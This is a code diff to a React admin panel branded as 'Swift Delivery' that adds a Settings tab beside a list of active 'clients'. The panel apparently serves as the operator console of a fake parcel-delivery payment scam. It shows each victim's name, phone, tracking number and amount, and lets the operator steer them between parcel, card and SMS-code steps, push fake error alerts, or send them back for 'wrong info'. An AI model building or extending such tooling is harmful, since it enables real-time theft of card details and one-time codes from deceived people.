@@ -4,6 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { 
   RefreshCw, 
   CreditCard, 
@@ -16,11 +17,13 @@ import {
   AlertTriangle,
   Info,
   XCircle,
-  LogOut
+  LogOut,
+  Settings
 } from "lucide-react";
 import { toast } from "@/hooks/use-toast";
 import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
 import AdminLogin from "@/components/AdminLogin";
+import AdminSettings from "@/components/AdminSettings";
 import {
   Select,
   SelectContent,
@@ -270,193 +273,212 @@ const AdminPanel = () => {
       </header>
 
       <main className="container mx-auto px-4 py-8">
-        {loading ? (
-          <div className="flex items-center justify-center py-20">
-            <RefreshCw className="w-8 h-8 animate-spin text-muted-foreground" />
-          </div>
-        ) : sessions.length === 0 ? (
-          <Card className="text-center py-20">
-            <CardContent>
-              <Users className="w-16 h-16 mx-auto text-muted-foreground mb-4" />
-              <h2 className="text-xl font-semibold mb-2">No Active Clients</h2>
-              <p className="text-muted-foreground">
-                When clients start the payment flow, they will appear here.
-              </p>
-            </CardContent>
-          </Card>
-        ) : (
-          <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
-            {sessions.map((session) => (
-              <Card key={session.id} className="overflow-hidden">
-                <CardHeader className="pb-3">
-                  <div className="flex items-center justify-between">
-                    <CardTitle className="text-lg flex items-center gap-2">
-                      <span className="font-mono bg-muted px-2 py-1 rounded text-sm">
-                        #{session.session_code}
-                      </span>
-                    </CardTitle>
-                    <Badge className={`${stepColors[session.current_step]} text-white`}>
-                      {stepNames[session.current_step]}
-                    </Badge>
-                  </div>
-                </CardHeader>
-                <CardContent className="space-y-4">
-                  {/* Client Info */}
-                  <div className="space-y-2 text-sm">
-                    {session.client_name && (
-                      <div className="flex justify-between">
-                        <span className="text-muted-foreground">Name:</span>
-                        <span className="font-medium">{session.client_name}</span>
-                      </div>
-                    )}
-                    {session.phone_number && (
-                      <div className="flex justify-between">
-                        <span className="text-muted-foreground">Phone:</span>
-                        <span className="font-medium">{session.phone_number}</span>
-                      </div>
-                    )}
-                    {session.parcel_tracking && (
-                      <div className="flex justify-between">
-                        <span className="text-muted-foreground">Tracking:</span>
-                        <span className="font-mono text-xs">{session.parcel_tracking}</span>
-                      </div>
-                    )}
-                    {session.amount && (
-                      <div className="flex justify-between">
-                        <span className="text-muted-foreground">Amount:</span>
-                        <span className="font-semibold text-primary">£{session.amount.toFixed(2)}</span>
-                      </div>
-                    )}
-                    <div className="flex justify-between items-center pt-2 border-t">
-                      <span className="text-muted-foreground flex items-center gap-1">
-                        <Clock className="w-3 h-3" /> Updated:
-                      </span>
-                      <span className="text-xs">{getTimeSince(session.updated_at)}</span>
-                    </div>
-                  </div>
+        <Tabs defaultValue="clients" className="space-y-6">
+          <TabsList className="grid w-full max-w-md grid-cols-2">
+            <TabsTrigger value="clients" className="gap-2">
+              <Users className="w-4 h-4" />
+              Clients
+            </TabsTrigger>
+            <TabsTrigger value="settings" className="gap-2">
+              <Settings className="w-4 h-4" />
+              Settings
+            </TabsTrigger>
+          </TabsList>
 
-                  {/* Current Message Status */}
-                  {session.admin_message && (
-                    <div className="p-2 rounded bg-muted border">
-                      <div className="flex items-center justify-between">
-                        <div className="flex items-center gap-2 text-sm">
-                          {session.message_type === "error" && <XCircle className="w-4 h-4 text-red-500" />}
-                          {session.message_type === "warning" && <AlertTriangle className="w-4 h-4 text-yellow-500" />}
-                          {session.message_type === "info" && <Info className="w-4 h-4 text-blue-500" />}
-                          <span className="truncate max-w-[150px]">{session.admin_message}</span>
-                        </div>
-                        <Button 
-                          variant="ghost" 
-                          size="sm"
-                          onClick={() => clearMessage(session.id)}
-                        >
-                          <XCircle className="w-4 h-4" />
-                        </Button>
-                      </div>
-                    </div>
-                  )}
-
-                  {/* Send Message */}
-                  <div className="space-y-2 pt-2 border-t">
-                    <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
-                      Send Alert to Client:
-                    </p>
-                    <div className="flex gap-2">
-                      <Select
-                        value={messageInputs[session.id]?.type || "error"}
-                        onValueChange={(value) => setMessageInputs(prev => ({
-                          ...prev,
-                          [session.id]: { ...prev[session.id], type: value, message: prev[session.id]?.message || "" }
-                        }))}
-                      >
-                        <SelectTrigger className="w-[100px]">
-                          <SelectValue />
-                        </SelectTrigger>
-                        <SelectContent>
-                          {messageTypes.map((type) => (
-                            <SelectItem key={type.value} value={type.value}>
-                              <div className="flex items-center gap-2">
-                                <type.icon className={`w-4 h-4 ${type.color}`} />
-                                {type.label}
-                              </div>
-                            </SelectItem>
-                          ))}
-                        </SelectContent>
-                      </Select>
-                      <Input
-                        placeholder="Enter message..."
-                        value={messageInputs[session.id]?.message || ""}
-                        onChange={(e) => setMessageInputs(prev => ({
-                          ...prev,
-                          [session.id]: { ...prev[session.id], message: e.target.value, type: prev[session.id]?.type || "error" }
-                        }))}
-                        className="flex-1"
-                      />
-                      <Button 
-                        size="icon"
-                        onClick={() => sendMessage(session.id)}
-                      >
-                        <Send className="w-4 h-4" />
-                      </Button>
-                    </div>
-                  </div>
-
-                  {/* Control Buttons */}
-                  <div className="space-y-2 pt-2 border-t">
-                    <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
-                      Send Client To:
-                    </p>
-                    <div className="grid grid-cols-3 gap-2">
-                      <Button
-                        variant={session.current_step === 1 ? "default" : "outline"}
-                        size="sm"
-                        className="flex-col h-auto py-2 gap-1"
-                        onClick={() => updateClientStep(session.id, 1)}
-                        disabled={session.current_step === 1}
-                      >
-                        <Package className="w-4 h-4" />
-                        <span className="text-xs">Parcel</span>
-                      </Button>
-                      <Button
-                        variant={session.current_step === 2 ? "default" : "outline"}
-                        size="sm"
-                        className="flex-col h-auto py-2 gap-1"
-                        onClick={() => updateClientStep(session.id, 2)}
-                        disabled={session.current_step === 2}
-                      >
-                        <CreditCard className="w-4 h-4" />
-                        <span className="text-xs">Card</span>
-                      </Button>
-                      <Button
-                        variant={session.current_step === 3 ? "default" : "outline"}
-                        size="sm"
-                        className="flex-col h-auto py-2 gap-1"
-                        onClick={() => updateClientStep(session.id, 3)}
-                        disabled={session.current_step === 3}
-                      >
-                        <MessageSquare className="w-4 h-4" />
-                        <span className="text-xs">SMS</span>
-                      </Button>
-                    </div>
-                  </div>
-
-                  {/* Quick Actions */}
-                  {session.current_step > 1 && (
-                    <Button
-                      variant="destructive"
-                      size="sm"
-                      className="w-full gap-2"
-                      onClick={() => updateClientStep(session.id, session.current_step - 1)}
-                    >
-                      <ArrowLeft className="w-4 h-4" />
-                      Send Back (Wrong Info)
-                    </Button>
-                  )}
+          <TabsContent value="clients">
+            {loading ? (
+              <div className="flex items-center justify-center py-20">
+                <RefreshCw className="w-8 h-8 animate-spin text-muted-foreground" />
+              </div>
+            ) : sessions.length === 0 ? (
+              <Card className="text-center py-20">
+                <CardContent>
+                  <Users className="w-16 h-16 mx-auto text-muted-foreground mb-4" />
+                  <h2 className="text-xl font-semibold mb-2">No Active Clients</h2>
+                  <p className="text-muted-foreground">
+                    When clients start the payment flow, they will appear here.
+                  </p>
                 </CardContent>
               </Card>
-            ))}
-          </div>
-        )}
+            ) : (
+              <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
+                {sessions.map((session) => (
+                  <Card key={session.id} className="overflow-hidden">
+                    <CardHeader className="pb-3">
+                      <div className="flex items-center justify-between">
+                        <CardTitle className="text-lg flex items-center gap-2">
+                          <span className="font-mono bg-muted px-2 py-1 rounded text-sm">
+                            #{session.session_code}
+                          </span>
+                        </CardTitle>
+                        <Badge className={`${stepColors[session.current_step]} text-white`}>
+                          {stepNames[session.current_step]}
+                        </Badge>
+                      </div>
+                    </CardHeader>
+                    <CardContent className="space-y-4">
+                      {/* Client Info */}
+                      <div className="space-y-2 text-sm">
+                        {session.client_name && (
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Name:</span>
+                            <span className="font-medium">{session.client_name}</span>
+                          </div>
+                        )}
+                        {session.phone_number && (
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Phone:</span>
+                            <span className="font-medium">{session.phone_number}</span>
+                          </div>
+                        )}
+                        {session.parcel_tracking && (
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Tracking:</span>
+                            <span className="font-mono text-xs">{session.parcel_tracking}</span>
+                          </div>
+                        )}
+                        {session.amount && (
+                          <div className="flex justify-between">
+                            <span className="text-muted-foreground">Amount:</span>
+                            <span className="font-semibold text-primary">£{session.amount.toFixed(2)}</span>
+                          </div>
+                        )}
+                        <div className="flex justify-between items-center pt-2 border-t">
+                          <span className="text-muted-foreground flex items-center gap-1">
+                            <Clock className="w-3 h-3" /> Updated:
+                          </span>
+                          <span className="text-xs">{getTimeSince(session.updated_at)}</span>
+                        </div>
+                      </div>
+
+                      {/* Current Message Status */}
+                      {session.admin_message && (
+                        <div className="p-2 rounded bg-muted border">
+                          <div className="flex items-center justify-between">
+                            <div className="flex items-center gap-2 text-sm">
+                              {session.message_type === "error" && <XCircle className="w-4 h-4 text-red-500" />}
+                              {session.message_type === "warning" && <AlertTriangle className="w-4 h-4 text-yellow-500" />}
+                              {session.message_type === "info" && <Info className="w-4 h-4 text-blue-500" />}
+                              <span className="truncate max-w-[150px]">{session.admin_message}</span>
+                            </div>
+                            <Button 
+                              variant="ghost" 
+                              size="sm"
+                              onClick={() => clearMessage(session.id)}
+                            >
+                              <XCircle className="w-4 h-4" />
+                            </Button>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Send Message */}
+                      <div className="space-y-2 pt-2 border-t">
+                        <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
+                          Send Alert to Client:
+                        </p>
+                        <div className="flex gap-2">
+                          <Select
+                            value={messageInputs[session.id]?.type || "error"}
+                            onValueChange={(value) => setMessageInputs(prev => ({
+                              ...prev,
+                              [session.id]: { ...prev[session.id], type: value, message: prev[session.id]?.message || "" }
+                            }))}
+                          >
+                            <SelectTrigger className="w-[100px]">
+                              <SelectValue />
+                            </SelectTrigger>
+                            <SelectContent>
+                              {messageTypes.map((type) => (
+                                <SelectItem key={type.value} value={type.value}>
+                                  <div className="flex items-center gap-2">
+                                    <type.icon className={`w-4 h-4 ${type.color}`} />
+                                    {type.label}
+                                  </div>
+                                </SelectItem>
+                              ))}
+                            </SelectContent>
+                          </Select>
+                          <Input
+                            placeholder="Enter message..."
+                            value={messageInputs[session.id]?.message || ""}
+                            onChange={(e) => setMessageInputs(prev => ({
+                              ...prev,
+                              [session.id]: { ...prev[session.id], message: e.target.value, type: prev[session.id]?.type || "error" }
+                            }))}
+                            className="flex-1"
+                          />
+                          <Button 
+                            size="icon"
+                            onClick={() => sendMessage(session.id)}
+                          >
+                            <Send className="w-4 h-4" />
+                          </Button>
+                        </div>
+                      </div>
+
+                      {/* Control Buttons */}
+                      <div className="space-y-2 pt-2 border-t">
+                        <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
+                          Send Client To:
+                        </p>
+                        <div className="grid grid-cols-3 gap-2">
+                          <Button
+                            variant={session.current_step === 1 ? "default" : "outline"}
+                            size="sm"
+                            className="flex-col h-auto py-2 gap-1"
+                            onClick={() => updateClientStep(session.id, 1)}
+                            disabled={session.current_step === 1}
+                          >
+                            <Package className="w-4 h-4" />
+                            <span className="text-xs">Parcel</span>
+                          </Button>
+                          <Button
+                            variant={session.current_step === 2 ? "default" : "outline"}
+                            size="sm"
+                            className="flex-col h-auto py-2 gap-1"
+                            onClick={() => updateClientStep(session.id, 2)}
+                            disabled={session.current_step === 2}
+                          >
+                            <CreditCard className="w-4 h-4" />
+                            <span className="text-xs">Card</span>
+                          </Button>
+                          <Button
+                            variant={session.current_step === 3 ? "default" : "outline"}
+                            size="sm"
+                            className="flex-col h-auto py-2 gap-1"
+                            onClick={() => updateClientStep(session.id, 3)}
+                            disabled={session.current_step === 3}
+                          >
+                            <MessageSquare className="w-4 h-4" />
+                            <span className="text-xs">SMS</span>
+                          </Button>
+                        </div>
+                      </div>
+
+                      {/* Quick Actions */}
+                      {session.current_step > 1 && (
+                        <Button
+                          variant="destructive"
+                          size="sm"
+                          className="w-full gap-2"
+                          onClick={() => updateClientStep(session.id, session.current_step - 1)}
+                        >
+                          <ArrowLeft className="w-4 h-4" />
+                          Send Back (Wrong Info)
+                        </Button>
+                      )}
+                    </CardContent>
+                  </Card>
+                ))}
+              </div>
+            )}
+          </TabsContent>
+
+          <TabsContent value="settings">
+            <AdminSettings />
+          </TabsContent>
+        </Tabs>
       </main>
     </div>
   );
